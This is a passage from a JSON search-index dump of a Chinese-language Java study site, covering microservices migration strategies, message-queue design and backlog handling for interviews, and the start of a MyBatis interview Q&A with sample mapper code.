object-oriented designers, including ourselves, use the term service object in the Domain-Driven Design sense for an object that carries out a significant process that isn\u0026rsquo;t tied to an entity. This is a different concept to how we\u0026rsquo;re using \u0026ldquo;service\u0026rdquo; in this article. Sadly the term service has both meanings and we have to live with the polyseme.\n4: We consider an application to be a social construction that binds together a code base, group of functionality, and body of funding.\n5: The original paper can be found on Melvyn Conway\u0026rsquo;s website here.\n6: We can\u0026rsquo;t resist mentioning Jim Webber\u0026rsquo;s statement that ESB stands for \u0026ldquo;Egregious Spaghetti Box\u0026rdquo;.\n7: Netflix makes the link explicit - until recently referring to their architectural style as fine-grained SOA.\n8: At extremes of scale, organisations often move to binary protocols - protobufs for example. Systems using these still exhibit the characteristic of smart endpoints, dumb pipes - and trade off transparency for scale. Most web properties and certainly the vast majority of enterprises don\u0026rsquo;t need to make this tradeoff - transparency can be a big win.\n9: \u0026ldquo;YAGNI\u0026rdquo; or \u0026ldquo;You Aren\u0026rsquo;t Going To Need It\u0026rdquo; is an XP principle and exhortation to not add features until you know you need them.\n10: It\u0026rsquo;s a little disengenuous of us to claim that monoliths are single language - in order to build systems on todays web, you probably need to know JavaScript and XHTML, CSS, your server side language of choice, SQL and an ORM dialect. Hardly single language, but you know what we mean.\n11: Adrian Cockcroft specifically mentions \u0026ldquo;developer self-service\u0026rdquo; and \u0026ldquo;Developers run what they wrote\u0026rdquo;(sic) in this excellent presentation delivered at Flowcon in November, 2013.\n12: We are being a little disengenuous here. Obviously deploying more services, in more complex topologies is more difficult than deploying a single monolith. Fortunately, patterns reduce this complexity - investment in tooling is still a must though.\n13: In fact, Dan North refers to this style as Replaceable Component Architecture rather than microservices. Since this seems to talk to a subset of the characteristics we prefer the latter.\n14: Kent Beck highlights this as one his design principles in Implementation Patterns.\n15: And SOA is hardly the root of this history. I remember people saying \u0026ldquo;we\u0026rsquo;ve been doing this for years\u0026rdquo; when the SOA term appeared at the beginning of the century. One argument was that this style sees its roots as the way COBOL programs communicated via data files in the earliest days of enterprise computing. In another direction, one could argue that microservices are the same thing as the Erlang programming model, but applied to an enterprise application context.\n"},{"id":263,"href":"/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1/migrating-from-a-monolithic-architecture-to-a-microservices-architecture/","title":"migrating-from-a-monolithic-architecture-to-a-microservices-architecture","parent":"微软服务","content":"迁移到微服务综述    迁移单体式应用到微服务架构意味着一系列现代化过程，有点像这几代开发者一直在做的事情，实时上，当迁移时，我们可以重用一些想法。\n一个策略是：不要大规模（big bang）重写代码（只有当你承担重建一套全新基于微服务的应用时候可以采用重写这种方法）。重写代码听起来很不错，但实际上充满了风险最终可能会失败，就如 Martin Fowler 所说：\n “the only thing a Big Bang rewrite guarantees is a Big Bang!”\n 相反，应该采取逐步迁移单体式应用的策略，通过逐步生成微服务新应用，与旧的单体式应用集成，随着时间推移，单体式应用在整个架构中比例逐渐下降直到消失或者成为微服务架构一部分。这个策略有点像在高速路上限速到 70 迈对车做维护，尽管有挑战，但是比起重写的风险小很多。\nMartin Fowler 将这种现代化策略成为绞杀（Strangler）应用，名字来源于雨林中的绞杀藤（strangler vine），也叫绞杀榕 (strangler fig)。绞杀藤为了爬到森林顶端都要缠绕着大树生长，一段时间后，树死了，留下树形藤。这种应用也使用同一种模式，围绕着传统应用开发了新型微服务应用，传统应用会渐渐退出舞台。\n我们来看看其他可行策略。\n策略 1——停止挖掘    Law of Holes 是说当自己进洞就应该停止挖掘。对于单体式应用不可管理时这是最佳建议。换句话说，应该停止让单体式应用继续变大，也就是说当开发新功能时不应该为旧单体应用添加新代码，最佳方法应该是将新功能开发成独立微服务。如下图所示：\n除了新服务和传统应用，还有两个模块，其一是请求路由器，负责处理入口（http）请求，有点像之前提到的 API 网关。路由器将新功能请求发送给新开发的服务，而将传统请求还发给单体式应用。\n另外一个是胶水代码（glue code），将微服务和单体应用集成起来，微服务很少能独立存在，经常会访问单体应用的数据。胶水代码，可能在单体应用或者为服务或者二者兼而有之，负责数据整合。微服务通过胶水代码从单体应用中读写数据。​\n微服务有三种方式访问单体应用数据：\n 换气单体应用提供的远程 API 直接访问单体应用数据库 自己维护一份从单体应用中同步的数据  胶水代码也被称为容灾层（anti-corruption layer），这是因为胶水代码保护微服务全新域模型免受传统单体应用域模型污染。胶水代码在这两种模型间提供翻译功能。术语 anti-corruption layer 第一次出现在 Eric Evans 撰写的必读书 Domain Driven Design，随后就被提炼为一篇白皮书。开发容灾层可能有点不是很重要，但却是避免单体式泥潭的必要部分。\n将新功能以轻量级微服务方式实现由很多优点，例如可以阻止单体应用变的更加无法管理。微服务本身可以开发、部署和独立扩展。采用微服务架构会给开发者带来不同的切身感受。\n然而，这方法并不解决任何单体式本身问题，为了解决单体式本身问题必须深入单体应用 ​ 做出改变。我们来看看这么做的策略。\n策略 2——将前端和后端分离    减小单体式应用复杂度的策略是讲表现层和业务逻辑、数据访问层分开。典型的企业应用至少有三个不同元素构成：\n  表现层——处理 HTTP 请求，要么响应一个 RESTAPI 请求，要么是提供一个基于 HTML 的图形接口。对于一个复杂用户接口应用，表现层经常是代码重要的部分。\n  业务逻辑层——完成业务逻辑的应用核心。\n  数据访问层——访问基础元素，例如数据库和消息代理。\n  在表现层与业务数据访问层之间有清晰的隔离。业务层有由若干方面组成的粗粒度（coarse-grained）的 API，内部包含了业务逻辑元素。API 是可以将单体业务分割成两个更小应用的天然边界，其中一个应用是表现层，另外一个是业务和数据访问逻辑。分割后，表现逻辑应用远程调用业务逻辑应用，下图表示迁移前后架构不同：​\n单体应用这么分割有两个好处，其一使得应用两部分开发、部署和扩展各自独立，特别地，允许表现层开发者在用户界面上快速选择，进行 A/B 测试；其二，使得一些远程 API 可以被微服务调用。\n然而，这种策略只是部分的解决方案。很可能应用的两部分之一或者全部都是不可管理的，因此需要使用第三种策略来消除剩余的单体架构。\n策略 3——抽出服务    第三种迁移策略就是从单体应用中抽取出某些模块成为独立微服务。每当抽取一个模块变成微服务，单体应用就变简单一些；一旦转换足够多的模块，单体应用本身已经不成为问题了，要么消失了，要么简单到成为一个服务。\n排序那个模块应该被转成微服务    一个巨大的复杂单体应用由成十上百个模块构成，每个都是被抽取对象。决定第一个被抽取模块一般都是挑战，一般最好是从最容易抽取的模块开始，这会让开发者积累足够经验，这些经验可以为后续模块化工作带来巨大好处。\n转换模块成为微服务一般很耗费时间，一般可以根据获益程度来排序，一般从经常变化模块开始会获益最大。一旦转换一个模块为微服务，就可以将其开发部署成独立模块，从而加速开发进程。\n将资源消耗大户先抽取出来也是排序标准之一。例如，将内存数据库抽取出来成为一个微服务会非常有用，可以将其部署在大内存主机上。同样的，将对计算资源很敏感的算法应用抽取出来也是非常有益的，这种服务可以被部署在有很多 CPU 的主机上。通过将资源消耗模块转换成微服务，可以使得应用易于扩展。\n查找现有粗粒度边界来决定哪个模块应该被抽取，也是很有益的，这使得移植工作更容易和简单。例如，只与其他应用异步同步消息的模块就是一个明显边界，可以很简单容易地将其转换为微服务。\n如何抽取模块    抽取模块第一步就是定义好模块和单体应用之间粗粒度接口，由于单体应用需要微服务的数据，反之亦然，因此更像是一个双向 API。因为必须在负责依赖关系和细粒度接口模式之间做好平衡，因此开发这种 API 很有挑战性，尤其对使用域模型模式的业务逻辑层来说更具有挑战，因此经常需要改变代码来解决依赖性问题，如图所示：\n一旦完成粗粒度接口，也就将此模块转换成独立微服务。为了实现，必须写代码使得单体应用和微服务之间通过使用进程间通信（IPC）机制的 API 来交换信息。如图所示迁移前后对比：\n此例中，正在使用 Y 模块的 Z 模块是备选抽取模块，其元素正在被 X 模块使用，迁移第一步就是定义一套粗粒度 APIs，第一个接口应该是被 X 模块使用的内部接口，用于激活 Z 模块；第二个接口是被 Z 模块使用的外部接口，用于激活 Y 模块。\n迁移第二步就是将模块转换成独立服务。内部和外部接口都使用基于 IPC 机制的代码，一般都会将 Z 模块整合成一个微服务基础框架，来出来割接过程中的问题，例如服务发现。\n抽取完模块，也就可以开发、部署和扩展另外一个服务，此服务独立于单体应用和其它服务。可以从头写代码实现服务；这种情况下，将服务和单体应用整合的 API 代码成为容灾层，在两种域模型之间进行翻译工作。每抽取一个服务，就朝着微服务方向前进一步。随着时间推移，单体应用将会越来越简单，用户就可以增加更多独立的微服务。 将现有应用迁移成微服务架构的现代化应用，不应该通过从头重写代码方式实现，相反，应该通过逐步迁移的方式。有三种策略可以考虑：将新功能以微服务方式实现；将表现层与业务数据访问层分离；将现存模块抽取变成微服务。随着时间推移，微服务数量会增加，开发团队的弹性和效率将会大大增加。\n"},{"id":264,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/mq-design/","title":"mq-design","parent":"高并发","content":"面试题    如果让你写一个消息队列，该如何进行架构设计？说一下你的思路。\n面试官心理分析    其实聊到这个问题，一般面试官要考察两块：\n 你有没有对某一个消息队列做过较为深入的原理的了解，或者从整体了解把握住一个消息队列的架构原理。 看看你的设计能力，给你一个常见的系统，就是消息队列系统，看看你能不能从全局把握一下整体架构设计，给出一些关键点出来。  说实话，问类似问题的时候，大部分人基本都会蒙，因为平时从来没有思考过类似的问题，大多数人就是平时埋头用，从来不去思考背后的一些东西。类似的问题，比如，如果让你来设计一个 Spring 框架你会怎么做？如果让你来设计一个 Dubbo 框架你会怎么做？如果让你来设计一个 MyBatis 框架你会怎么做？\n面试题剖析    其实回答这类问题，说白了，不求你看过那技术的源码，起码你要大概知道那个技术的基本原理、核心组成部分、基本架构构成，然后参照一些开源的技术把一个系统设计出来的思路说一下就好。\n比如说这个消息队列系统，我们从以下几个角度来考虑一下：\n  首先这个 mq 得支持可伸缩性吧，就是需要的时候快速扩容，就可以增加吞吐量和容量，那怎么搞？设计个分布式的系统呗，参照一下 kafka 的设计理念，broker -\u0026gt; topic -\u0026gt; partition，每个 partition 放一个机器，就存一部分数据。如果现在资源不够了，简单啊，给 topic 增加 partition，然后做数据迁移，增加机器，不就可以存放更多数据，提供更高的吞吐量了？\n  其次你得考虑一下这个 mq 的数据要不要落地磁盘吧？那肯定要了，落磁盘才能保证别进程挂了数据就丢了。那落磁盘的时候怎么落啊？顺序写，这样就没有磁盘随机读写的寻址开销，磁盘顺序读写的性能是很高的，这就是 kafka 的思路。\n  其次你考虑一下你的 mq 的可用性啊？这个事儿，具体参考之前可用性那个环节讲解的 kafka 的高可用保障机制。多副本 -\u0026gt; leader \u0026amp; follower -\u0026gt; broker 挂了重新选举 leader 即可对外服务。\n  能不能支持数据 0 丢失啊？可以的，参考我们之前说的那个 kafka 数据零丢失方案。\n  mq 肯定是很复杂的，面试官问你这个问题，其实是个开放题，他就是看看你有没有从架构角度整体构思和设计的思维以及能力。确实这个问题可以刷掉一大批人，因为大部分人平时不思考这些东西。\n"},{"id":265,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/mq-interview/","title":"mq-interview","parent":"高并发","content":"消息队列面试场景    面试官：你好。\n候选人：你好。\n（面试官在你的简历上面看到了，呦，有个亮点，你在项目里用过 MQ ，比如说你用过 ActiveMQ ）\n面试官：你在系统里用过消息队列吗？（面试官在随和的语气中展开了面试）\n候选人：用过的（此时感觉没啥）\n面试官：那你说一下你们在项目里是怎么用消息队列的？\n候选人：巴拉巴拉，“我们啥啥系统发送个啥啥消息到队列，别的系统来消费啥啥的。比如我们有个订单系统，订单系统每次下一个新的订单的时候，就会发送一条消息到 ActiveMQ 里面去，后台有个库存系统负责获取消息然后更新库存。”\n（部分同学在这里会进入一个误区，就是你仅仅就是知道以及回答你们是怎么用这个消息队列的，用这个消息队列来干了个什么事情？）\n面试官：那你们为什么使用消息队列啊？你的订单系统不发送消息到 MQ ，直接订单系统调用库存系统一个接口，咔嚓一下，直接就调用成功，库存不也就更新了。\n候选人：额。。。（楞了一下，为什么？我没怎么仔细想过啊，老大让用就用了），硬着头皮胡言乱语了几句。\n（面试官此时听你楞了一下，然后听你胡言乱语了几句，开始心里觉得有点儿那什么了，怀疑你之前就压根儿没思考过这问题）\n面试官：那你说说用消息队列都有什么优点和缺点？\n（面试官此时心里想的是，你的 MQ 在项目里为啥要用，你没怎么考虑过，那我稍微简单点儿，我问问你消息队列你之前有没有考虑过如果用的话，优点和缺点分别是啥？）\n候选人：这个。。。（确实平时没怎么考虑过这个问题啊。。。胡言乱语了）\n（面试官此时心里已经更觉得你这哥儿们不行，平时都没什么思考）\n面试官： Kafka 、 ActiveMQ 、 RabbitMQ 、 RocketMQ 都有什么区别？\n（面试官问你这个问题，就是说，绕过比较虚的话题，直接看看你对各种 MQ 中间件是否了解，是否做过功课，是否做过调研）\n候选人：我们就用过 ActiveMQ ，所以别的没用过。。。区别，也不太清楚。。。\n（面试官此时更是觉得你这哥儿们平时就是瞎用，根本就没什么思考，觉得不行）\n面试官：那你们是如何保证消息队列的高可用啊？\n候选人：这个。。。我平时就是简单走 API 调用一下，不太清楚消息队列怎么部署的。。。\n面试官：如何保证消息不被重复消费啊？如何保证消费的时候是幂等的啊？\n候选人：啥？（ MQ 不就是写入\u0026amp;消费就可以了，哪来这么多问题）\n面试官：如何保证消息的可靠性传输啊？要是消息丢失了怎么办啊？\n候选人：我们没怎么丢过消息啊。。。\n面试官：那如何保证消息的顺序性？\n候选人：顺序性？什么意思？我为什么要保证消息的顺序性？它不是本来就有顺序吗？\n面试官：如何解决消息队列的延时以及过期失效问题？消息队列满了以后该怎么处理？有几百万消息持续积压几小时，说说怎么解决？\n候选人：不是，我这平时没遇到过这些问题啊，就是简单用用，知道 MQ 的一些功能。\n面试官：如果让你写一个消息队列，该如何进行架构设计啊？说一下你的思路。\n候选人：。。。。。我还是走吧。。。。\n 这其实是面试官的一种面试风格，就是说面试官的问题不是发散的，而是从一个小点慢慢铺开。比如说面试官可能会跟你聊聊高并发话题，就这个话题里面跟你聊聊缓存、 MQ 等等东西，由浅入深，一步步深挖。\n其实上面是一个非常典型的关于消息队列的技术考察过程，好的面试官一定是从你做过的某一个点切入，然后层层展开深入考察，一个接一个问，直到把这个技术点刨根问底，问到最底层。\n"},{"id":266,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/mq-time-delay-and-expired-failure/","title":"mq-time-delay-and-expired-failure","parent":"高并发","content":"面试题    如何解决消息队列的延时以及过期失效问题？消息队列满了以后该怎么处理？有几百万消息持续积压几小时，说说怎么解决？\n面试官心理分析    你看这问法，其实本质针对的场景，都是说，可能你的消费端出了问题，不消费了；或者消费的速度极其慢。接着就坑爹了，可能你的消息队列集群的磁盘都快写满了，都没人消费，这个时候怎么办？或者是这整个就积压了几个小时，你这个时候怎么办？或者是你积压的时间太长了，导致比如 RabbitMQ 设置了消息过期时间后就没了怎么办？\n所以就这事儿，其实线上挺常见的，一般不出，一出就是大 case。一般常见于，举个例子，消费端每次消费之后要写 mysql，结果 mysql 挂了，消费端 hang 那儿了，不动了；或者是消费端出了个什么岔子，导致消费速度极其慢。\n面试题剖析    关于这个事儿，我们一个一个来梳理吧，先假设一个场景，我们现在消费端出故障了，然后大量消息在 mq 里积压，现在出事故了，慌了。\n大量消息在 mq 里积压了几个小时了还没解决    几千万条数据在 MQ 里积压了七八个小时，从下午 4 点多，积压到了晚上 11 点多。这个是我们真实遇到过的一个场景，确实是线上故障了，这个时候要不然就是修复 consumer 的问题，让它恢复消费速度，然后傻傻的等待几个小时消费完毕。这个肯定不能在面试的时候说吧。\n一个消费者一秒是 1000 条，一秒 3 个消费者是 3000 条，一分钟就是 18 万条。所以如果你积压了几百万到上千万的数据，即使消费者恢复了，也需要大概 1 小时的时间才能恢复过来。\n一般这个时候，只能临时紧急扩容了，具体操作步骤和思路如下：\n 先修复 consumer 的问题，确保其恢复消费速度，然后将现有 consumer 都停掉。 新建一个 topic，partition 是原来的 10 倍，临时建立好原先 10 倍的 queue 数量。 然后写一个临时的分发数据的 consumer 程序，这个程序部署上去消费积压的数据，消费之后不做耗时的处理，直接均匀轮询写入临时建立好的 10 倍数量的 queue。 接着临时征用 10 倍的机器来部署 consumer，每一批 consumer 消费一个临时 queue 的数据。这种做法相当于是临时将 queue 资源和 consumer 资源扩大 10 倍，以正常的 10 倍速度来消费数据。 等快速消费完积压数据之后，得恢复原先部署的架构，重新用原先的 consumer 机器来消费消息。  mq 中的消息过期失效了    假设你用的是 RabbitMQ，RabbtiMQ 是可以设置过期时间的，也就是 TTL。如果消息在 queue 中积压超过一定的时间就会被 RabbitMQ 给清理掉，这个数据就没了。那这就是第二个坑了。这就不是说数据会大量积压在 mq 里，而是大量的数据会直接搞丢。\n这个情况下，就不是说要增加 consumer 消费积压的消息，因为实际上没啥积压，而是丢了大量的消息。我们可以采取一个方案，就是批量重导，这个我们之前线上也有类似的场景干过。就是大量积压的时候，我们当时就直接丢弃数据了，然后等过了高峰期以后，比如大家一起喝咖啡熬夜到晚上 12 点以后，用户都睡觉了。这个时候我们就开始写程序，将丢失的那批数据，写个临时程序，一点一点的查出来，然后重新灌入 mq 里面去，把白天丢的数据给他补回来。也只能是这样了。\n假设 1 万个订单积压在 mq 里面，没有处理，其中 1000 个订单都丢了，你只能手动写程序把那 1000 个订单给查出来，手动发到 mq 里去再补一次。\nmq 都快写满了    如果消息积压在 mq 里，你很长时间都没有处理掉，此时导致 mq 都快写满了，咋办？这个还有别的办法吗？没有，谁让你第一个方案执行的太慢了，你临时写程序，接入数据来消费，消费一个丢弃一个，都不要了，快速消费掉所有的消息。然后走第二个方案，到了晚上再补数据吧。\n 对于 RocketMQ，官方针对消息积压问题，提供了解决方案。\n1. 提高消费并行度    绝大部分消息消费行为都属于 IO 密集型，即可能是操作数据库，或者调用 RPC，这类消费行为的消费速度在于后端数据库或者外系统的吞吐量，通过增加消费并行度，可以提高总的消费吞吐量，但是并行度增加到一定程度，反而会下降。所以，应用必须要设置合理的并行度。 如下有几种修改消费并行度的方法：\n同一个 ConsumerGroup 下，通过增加 Consumer 实例数量来提高并行度（需要注意的是超过订阅队列数的 Consumer 实例无效）。可以通过加机器，或者在已有机器启动多个进程的方式。 提高单个 Consumer 的消费并行线程，通过修改参数 consumeThreadMin、consumeThreadMax 实现。\n2. 批量方式消费    某些业务流程如果支持批量方式消费，则可以很大程度上提高消费吞吐量，例如订单扣款类应用，一次处理一个订单耗时 1 s，一次处理 10 个订单可能也只耗时 2 s，这样即可大幅度提高消费的吞吐量，通过设置 consumer 的 consumeMessageBatchMaxSize 返个参数，默认是 1，即一次只消费一条消息，例如设置为 N，那么每次消费的消息数小于等于 N。\n3. 跳过非重要消息    发生消息堆积时，如果消费速度一直追不上发送速度，如果业务对数据要求不高的话，可以选择丢弃不重要的消息。例如，当某个队列的消息数堆积到 100000 条以上，则尝试丢弃部分或全部消息，这样就可以快速追上发送消息的速度。示例代码如下：\npublic ConsumeConcurrentlyStatus consumeMessage( List\u0026lt;MessageExt\u0026gt; msgs, ConsumeConcurrentlyContext context) { long offset = msgs.get(0).getQueueOffset(); String maxOffset = msgs.get(0).getProperty(Message.PROPERTY_MAX_OFFSET); long diff = Long.parseLong(maxOffset) - offset; if (diff \u0026gt; 100000) { // TODO 消息堆积情况的特殊处理  return ConsumeConcurrentlyStatus.CONSUME_SUCCESS; } // TODO 正常消费过程  return ConsumeConcurrentlyStatus.CONSUME_SUCCESS; } 4. 优化每条消息消费过程    举例如下，某条消息的消费过程如下：\n 根据消息从 DB 查询【数据 1】 根据消息从 DB 查询【数据 2】 复杂的业务计算 向 DB 插入【数据 3】 向 DB 插入【数据 4】  这条消息的消费过程中有 4 次与 DB 的 交互，如果按照每次 5ms 计算，那么总共耗时 20ms，假设业务计算耗时 5ms，那么总过耗时 25ms，所以如果能把 4 次 DB 交互优化为 2 次，那么总耗时就可以优化到 15ms，即总体性能提高了 40%。所以应用如果对时延敏感的话，可以把 DB 部署在 SSD 硬盘，相比于 SCSI 磁盘，前者的 RT 会小很多。\n"},{"id":267,"href":"/system-design/framework/mybatis/mybatis-interview/","title":"mybatis-interview","parent":"mybatis","content":" 本篇文章是JavaGuide收集自网络，原出处不明。\n MyBatis 技术内幕系列博客，从原理和源码角度，介绍了其内部实现细节，无论是写的好与不好，我确实是用心写了，由于并不是介绍如何使用 MyBatis 的文章，所以，一些参数使用细节略掉了，我们的目标是介绍 MyBatis 的技术架构和重要组成部分，以及基本运行原理。\n博客写的很辛苦，但是写出来却不一定好看，所谓开始很兴奋，过程很痛苦，结束很遗憾。要求不高，只要读者能从系列博客中，学习到一点其他博客所没有的技术点，作为作者，我就很欣慰了，我也读别人写的博客，通常对自己当前研究的技术，是很有帮助的。\n尽管还有很多可写的内容，但是，我认为再写下去已经没有意义，任何其他小的功能点，都是在已经介绍的基本框架和基本原理下运行的，只有结束，才能有新的开始。写博客也积攒了一些经验，源码多了感觉就是复制黏贴，源码少了又觉得是空谈原理，将来再写博客，我希望是“精炼博文”，好读好懂美观读起来又不累，希望自己能再写一部开源分布式框架原理系列博客。\n有胆就来，我出几道 MyBatis 面试题，看你能回答上来几道（都是我出的，可不是网上找的）。\n1、#{}和${}的区别是什么？    注：这道题是面试官面试我同事的。\n答：\n ${}是 Properties 文件中的变量占位符，它可以用于标签属性值和 sql 内部，属于静态文本替换，比如${driver}会被静态替换为com.mysql.jdbc.Driver。 #{}是 sql 的参数占位符，MyBatis 会将 sql 中的#{}替换为?号，在 sql 执行前会使用 PreparedStatement 的参数设置方法，按序给 sql 的?号占位符设置参数值，比如 ps.setInt(0, parameterValue)，#{item.name} 的取值方式为使用反射从参数对象中获取 item 对象的 name 属性值，相当于 param.getItem().getName()。  2、Xml 映射文件中，除了常见的 select|insert|update|delete 标签之外，还有哪些标签？    注：这道题是京东面试官面试我时问的。\n答：还有很多其他的标签，\u0026lt;resultMap\u0026gt;、\u0026lt;parameterMap\u0026gt;、\u0026lt;sql\u0026gt;、\u0026lt;include\u0026gt;、\u0026lt;selectKey\u0026gt;，加上动态 sql 的 9 个标签，trim|where|set|foreach|if|choose|when|otherwise|bind等，其中为 sql 片段标签，通过\u0026lt;include\u0026gt;标签引入 sql 片段，\u0026lt;selectKey\u0026gt;为不支持自增的主键生成策略标签。\n3、最佳实践中，通常一个 Xml 映射文件，都会写一个 Dao 接口与之对应，请问，这个 Dao 接口的工作原理是什么？Dao 接口里的方法，参数不同时，方法能重载吗？    注：这道题也是京东面试官面试我被问的。\n答：Dao 接口，就是人们常说的 Mapper接口，接口的全限名，就是映射文件中的 namespace 的值，接口的方法名，就是映射文件中MappedStatement的 id 值，接口方法内的参数，就是传递给 sql 的参数。Mapper接口是没有实现类的，当调用接口方法时，接口全限名+方法名拼接字符串作为 key 值，可唯一定位一个MappedStatement，举例：com.mybatis3.mappers.StudentDao.findStudentById，可以唯一找到 namespace 为com.mybatis3.mappers.StudentDao下面id = findStudentById的MappedStatement。在 MyBatis 中，每一个\u0026lt;select\u0026gt;、\u0026lt;insert\u0026gt;、\u0026lt;update\u0026gt;、\u0026lt;delete\u0026gt;标签，都会被解析为一个MappedStatement对象。\nDao 接口里的方法，是不能重载的，因为是全限名+方法名的保存和寻找策略。\nDao 接口里的方法可以重载，但是Mybatis的XML里面的ID不允许重复。\nMybatis版本3.3.0，亲测如下：\n/** * Mapper接口里面方法重载 */ public interface StuMapper { List\u0026lt;Student\u0026gt; getAllStu(); List\u0026lt;Student\u0026gt; getAllStu(@Param(\u0026#34;id\u0026#34;) Integer id); } 然后在 StuMapper.xml 中利用Mybatis的动态sql就可以实现。\n\u0026lt;select id=\u0026#34;getAllStu\u0026#34; resultType=\u0026#34;com.pojo.Student\u0026#34;\u0026gt; select * from student \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;id != null\u0026#34;\u0026gt; id = #{id} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; 能正常运行，并能得到相应的结果，这样就实现了在Dao接口中写重载方法。\nMybatis 的 Dao 接口可以有多个重载方法，但是多个接口对应的映射必须只有一个，否则启动会报错。\n相关 issue ：更正：Dao 接口里的方法可以重载，但是Mybatis的XML里面的ID不允许重复！。\nDao 接口的工作原理是 JDK 动态代理，MyBatis 运行时会使用 JDK 动态代理为 Dao 接口生成代理 proxy 对象，代理对象 proxy 会拦截接口方法，转而执行MappedStatement所代表的 sql，然后将 sql 执行结果返回。\n==补充：==    Dao接口方法可以重载，但是需要满足以下条件：\n 仅有一个无参方法和一个有参方法 多个有参方法时，参数数量必须一致。且使用相同的 @Param ，或者使用 param1 这种  测试如下：\nPersonDao.java\nPerson queryById(); Person queryById(@Param(\u0026#34;id\u0026#34;) Long id); Person queryById(@Param(\u0026#34;id\u0026#34;) Long id, @Param(\u0026#34;name\u0026#34;) String name); PersonMapper.xml\n\u0026lt;select id=\u0026#34;queryById\u0026#34; resultMap=\u0026#34;PersonMap\u0026#34;\u0026gt; select id, name, age, address from person \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;id != null\u0026#34;\u0026gt; id = #{id} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;name != null and name != \u0026#39;\u0026#39;\u0026#34;\u0026gt; name = #{name} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; limit 1 \u0026lt;/select\u0026gt; org.apache.ibatis.scripting.xmltags.DynamicContext.ContextAccessor#getProperty方法用于获取\u0026lt;if\u0026gt;标签中的条件值\npublic Object getProperty(Map context, Object target, Object name) { Map map = (Map) target; Object result = map.get(name); if (map.containsKey(name) || result != null) { return result; } Object parameterObject = map.get(PARAMETER_OBJECT_KEY); if (parameterObject instanceof Map) { return ((Map)parameterObject).get(name); } return null; } parameterObject为map，存放的是Dao接口中参数相关信息。\n((Map)parameterObject).get(name)方法如下\npublic V get(Object key) { if (!super.containsKey(key)) { throw new BindingException(\u0026#34;Parameter \u0026#39;\u0026#34; + key + \u0026#34;\u0026#39; not found. Available parameters are \u0026#34; + keySet()); } return super.get(key); }  queryById()方法执行时，parameterObject为null，getProperty方法返回null值，\u0026lt;if\u0026gt;标签获取的所有条件值都为null，所有条件不成立，动态sql可以正常执行。 queryById(1L)方法执行时，parameterObject为map，包含了id和param1两个key值。当获取\u0026lt;if\u0026gt;标签中name的属性值时，进入((Map)parameterObject).get(name)方法中，map中key不包含name，所以抛出异常。 queryById(1L,\u0026quot;1\u0026quot;)方法执行时，parameterObject中包含id,param1,name,param2四个key值，id和name属性都可以获取到，动态sql正常执行。  4、MyBatis 是如何进行分页的？分页插件的原理是什么？    注：我出的。\n答：(1) MyBatis 使用 RowBounds 对象进行分页，它是针对 ResultSet 结果集执行的内存分页，而非物理分页；(2) 可以在 sql 内直接书写带有物理分页的参数来完成物理分页功能，(3) 也可以使用分页插件来完成物理分页。\n分页插件的基本原理是使用 MyBatis 提供的插件接口，实现自定义插件，在插件的拦截方法内拦截待执行的 sql，然后重写 sql，根据 dialect 方言，添加对应的物理分页语句和物理分页参数。\n举例：select _ from student，拦截 sql 后重写为：select t._ from （select \\* from student）t limit 0，10\n5、简述 MyBatis 的插件运行原理，以及如何编写一个插件。    注：我出的。\n答：MyBatis 仅可以编写针对 ParameterHandler、ResultSetHandler、StatementHandler、Executor 这 4 种接口的插件，MyBatis 使用 JDK 的动态代理，为需要拦截的接口生成代理对象以实现接口方法拦截功能，每当执行这 4 种接口对象的方法时，就会进入拦截方法，具体就是 InvocationHandler 的 invoke()方法，当然，只会拦截那些你指定需要拦截的方法。\n实现 MyBatis 的 Interceptor 接口并复写 intercept()方法，然后在给插件编写注解，指定要拦截哪一个接口的哪些方法即可，记住，别忘了在配置文件中配置你编写的插件。\n6、MyBatis 执行批量插入，能返回数据库主键列表吗？    注：我出的。\n答：能，JDBC 都能，MyBatis 当然也能。\n7、MyBatis 动态 sql 是做什么的？都有哪些动态 sql？能简述一下动态 sql 的执行原理不？    注：我出的。\n答：MyBatis 动态 sql 可以让我们在 Xml 映射文件内，以标签的形式编写动态 sql，完成逻辑判断和动态拼接 sql 的功能，MyBatis 提供了 9 种动态 sql 标签 trim|where|set|foreach|if|choose|when|otherwise|bind。\n其执行原理为，使用 OGNL 从 sql 参数对象中计算表达式的值，根据表达式的值动态拼接 sql，以此来完成动态 sql 的功能。\n8、MyBatis 是如何将 sql 执行结果封装为目标对象并返回的？都有哪些映射形式？    注：我出的。\n答：第一种是使用\u0026lt;resultMap\u0026gt;标签，逐一定义列名和对象属性名之间的映射关系。第二种是使用 sql 列的别名功能，将列别名书写为对象属性名，比如 T_NAME AS NAME，对象属性名一般是 name，小写，但是列名不区分大小写，MyBatis 会忽略列名大小写，智能找到与之对应对象属性名，你甚至可以写成 T_NAME AS NaMe，MyBatis 一样可以正常工作。\n有了列名与属性名的映射关系后，MyBatis 通过反射创建对象，同时使用反射给对象的属性逐一赋值并返回，那些找不到映射关系的属性，是无法完成赋值的。\n9、MyBatis 能执行一对一、一对多的关联查询吗？都有哪些实现方式，以及它们之间的区别。    注：我出的。\n答：能，MyBatis 不仅可以执行一对一、一对多的关联查询，还可以执行多对一，多对多的关联查询，多对一查询，其实就是一对一查询，只需要把 selectOne()修改为 selectList()即可；多对多查询，其实就是一对多查询，只需要把 selectOne()修改为 selectList()即可。\n关联对象查询，有两种实现方式，一种是单独发送一个 sql 去查询关联对象，赋给主对象，然后返回主对象。另一种是使用嵌套查询，嵌套查询的含义为使用 join 查询，一部分列是 A 对象的属性值，另外一部分列是关联对象 B 的属性值，好处是只发一个 sql 查询，就可以把主对象和其关联对象查出来。\n那么问题来了，join 查询出来 100 条记录，如何确定主对象是 5 个，而不是 100 个？其去重复的原理是\u0026lt;resultMap\u0026gt;标签内的\u0026lt;id\u0026gt;子标签，指定了唯一确定一条记录的 id 列，MyBatis 根据列值来完成 100 